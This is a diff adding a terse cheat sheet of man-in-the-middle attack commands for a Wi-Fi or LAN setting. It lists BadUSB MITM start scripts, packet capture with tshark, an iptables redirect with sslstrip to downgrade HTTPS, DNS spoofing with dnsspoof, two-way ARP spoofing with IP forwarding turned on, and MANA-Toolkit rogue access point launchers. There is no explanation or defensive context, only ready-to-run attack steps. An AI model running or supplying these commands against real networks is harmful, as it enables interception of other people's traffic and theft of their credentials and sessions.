@@ -1,0 +1,38 @@
+BAD USB MITM
+-----------------------
+bash flushiptables.sh
+bash startbadusb-kitkat.sh
+bash startbadusb-lollipop.sh
+-----------------------
+
+WIRESHARK
+-----------------------
+tshark -i <interface> -w <file.cap>
+-----------------------
+
+BYPASS HTTPS
+-----------------------
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+sslstrip -p
+-----------------------
+
+DNS SPOOFING
+-----------------------
+dnsspoof -i <interface> -f <path to config file>
+-----------------------
+
+ARP SPOOFING
+-----------------------
+arpspoof -i <interface> -t <target ip> <ap ip>
+arpspoof -i <interface> -t <ap ip> <target ip>
+echo 1 > /proc/sys/net/ipv4/ip_forward
+-----------------------
+
+MANA-Toolkit
+-----------------------
+bash /usr/share/mana-toolkit/run-mana/<script.sh>
+    start-noupstream.sh
+    start-nat-simple.sh
+    start-nat-full.sh
+-----------------------
+
